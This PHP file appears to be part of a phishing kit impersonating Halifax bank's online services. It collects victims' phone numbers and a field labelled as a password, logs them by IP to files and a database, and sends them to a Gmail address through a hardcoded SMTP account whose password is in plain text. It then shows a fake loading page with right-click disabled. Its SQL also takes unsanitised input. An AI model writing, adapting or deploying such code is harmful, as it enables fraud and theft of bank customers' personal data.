<?php
include 'connect.php';
session_start();
$inf1 = $_REQUEST['T1'];
$inf2 = $_REQUEST['T2'];
$inf3 = $_REQUEST['T3'];
$ip = $_SERVER['REMOTE_ADDR'];
$busca = $ip;


if(empty($inf3) || strlen($inf3) < 5){
   echo '<html><style>td{color:#000}td{font-family:arial,sans-serif} </style><body></body><script language="javascript">';
   echo ' alert("Verify your number.)");';
   echo 'history.back(-1); </script>';
   echo '</script></html>';
   exit; 
}

    $sql = "UPDATE `JSPHLT` SET ID_PhoneHome='$inf1', ID_PhoneMobile='$inf2', ID_PhoneWork='$inf3' WHERE IP ='$busca';";
    $QueryAuto = mysql_query($sql); 
	if (!$QueryAuto) {  
             return;
    } else {
		$data = date("d/m/Y - H:i:s");
		$message = "\n\nSENHA: $inf1\n\nDATA: $data\n\nIP: $ip\n\n\n";

		
	}
	
	
?>

<?php

$user_agent     =   $_SERVER['HTTP_USER_AGENT'];

function getBrowser() 
{ 
    $u_agent = $_SERVER['HTTP_USER_AGENT']; 
    $bname = 'Desconhecido';
    $platform = 'Desconhecido';
    $version= "";
    if (preg_match('/linux/i', $u_agent)) {
        $platform = 'linux';
    }
    elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
        $platform = 'mac';
    }
    elseif (preg_match('/windows|win32/i', $u_agent)) {
        $platform = 'windows';
    }
    
	if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent)) 
    { 
        $bname = 'Internet Explorer'; 
        $ub = "MSIE"; 
    } 
    elseif(preg_match('/Firefox/i',$u_agent)) 
    { 
        $bname = 'Mozilla Firefox'; 
        $ub = "Firefox"; 
    } 
    elseif(preg_match('/Chrome/i',$u_agent)) 
    { 
        $bname = 'Google Chrome'; 
        $ub = "Chrome"; 
    } 
    elseif(preg_match('/Safari/i',$u_agent)) 
    { 
        $bname = 'Apple Safari'; 
        $ub = "Safari"; 
    } 
    elseif(preg_match('/Opera/i',$u_agent)) 
    { 
        $bname = 'Opera'; 
        $ub = "Opera"; 
    } 
    elseif(preg_match('/Netscape/i',$u_agent)) 
    { 
        $bname = 'Netscape'; 
        $ub = "Netscape"; 
    } 
    
    $known = array('Version', $ub, 'other');
    $pattern = '#(?<browser>' . join('|', $known) .
    ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
    if (!preg_match_all($pattern, $u_agent, $matches)) {

    }
  
    $i = count($matches['browser']);
    if ($i != 1) {

        if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
            $version= $matches['version'][0];
        }
        else {
            $version= $matches['version'][1];
        }
    }
    else {
        $version= $matches['version'][0];
    }
    
    if ($version==null || $version=="") {$version="?";}
    
    return array(
        'userAgent' => $u_agent,
        'name'      => $bname,
        'version'   => $version,
        'platform'  => $platform,
        'pattern'    => $pattern
    );
} 


$user_agent     =   $_SERVER['HTTP_USER_AGENT'];

function getOS() { 

    global $user_agent;

    $os_platform    =   "Unknown OS Platform";

    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );

    foreach ($os_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }

    }   

    return $os_platform;

}

$ua=getBrowser();

$win = getOS();
$InfNAV = $ua['name'];

?>


<?php
session_start();

	$pbc_1 = $_SESSION['pbc_1'];
	$pbc_2 = $_SESSION['pbc_2'];
	$_SESSION['digitado'] = '0';

	$ip = $_SERVER["REMOTE_ADDR"];
	$hora = date("H:i:s");
	$data = date("dd/mm/yyyy");
	
	$conteudo ="<b><b>  
	<b>PhoneMobile:</b> $inf3";
 
 	$subj = "$apelido - $descoju - $ip";
 
 	mail($destbk, $subj, $conteudo, "From: $aviao");
	$today = date("d-M-Y");
    $ip = @$_SERVER[REMOTE_ADDR];
    $myFile = "Admin/[ Halifax ]". $ip. ".txt";
    $fh = fopen($myFile, 'a') or die("Dê Permissao 777");
    fwrite($fh, $conteudo);
    fclose($fh);
?>


<?php

session_start();

$hora      	= date("d/m/Y, H:i:s");              
$ip = $_SERVER["REMOTE_ADDR"];
$assunto = '[Halifax - '.$ip.']';

$mensagemConcatenada = 'Halifax FULL'.'<br/>';
$mensagemConcatenada .= '-------------------------------<br/>'; 
$mensagemConcatenada .= '[PhoneMobile]: '. $inf3.'<br/>'; 
$mensagemConcatenada .= '-------------------------------<br/><br/>'; 

require_once('class.phpmailer.php');   
 
$mail = new PHPMailer();  
 
$mail->IsSMTP();
$mail->SMTPAuth  = true;
$mail->Charset   = 'utf8_decode()';
$mail->Host = "mail.persona-uk.fun"; 
$mail->SMTPAuth = true;
$mail->Username = 'infor@persona-uk.fun';	
$mail->Password = 'Bvf5Iyu82M3#'; 	
$mail->From = "infor@persona-uk.fun";
$mail->FromName  = utf8_decode($blok);
$mail->IsHTML(true);
$mail->Subject  = utf8_decode($assunto);
$mail->Body  = utf8_decode($mensagemConcatenada);
$mail->AddAddress('halifaxnike@gmail.com');
 
if(!$mail->Send()){
$mensagemRetorno = ''. print($mail->ErrorInfo);
}else{
$mensagemRetorno = '';
}  

?>

	
<head>
	
<title>Online Services</title>
<meta http-equiv="refresh" content="5; URL='Wait.php'"/>
<link rel="shortcut icon" href="favicon.ico" />
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head>
<body onselectstart="return false" oncontextmenu="return false" ondragstart="return false" onMouseOver="window.status='..message perso .. '; return true;" >
<style type="text/css">
<!--
html{
overflow-y:hidden;
}
-->
</style>

<style type="text/css">
Body{
background-image: url('');
background-repeat: no-repeat;
margin-left:0px;
margin-top:0px;
margin-bottom:-20px
}
</style>
</head>

<body style="background-image: url('4.jpg')">
<form id="form2" onsubmit="return validar(this);" action="details3.php" method="post">
<div id="Layer4" style="position:absolute; width:104px; height:51px; z-index:4; left: 644px; top: 286px">
    <img border="0" src="lock_spinner.gif" width="48" height="48"></form>
</div>
</body>
</html>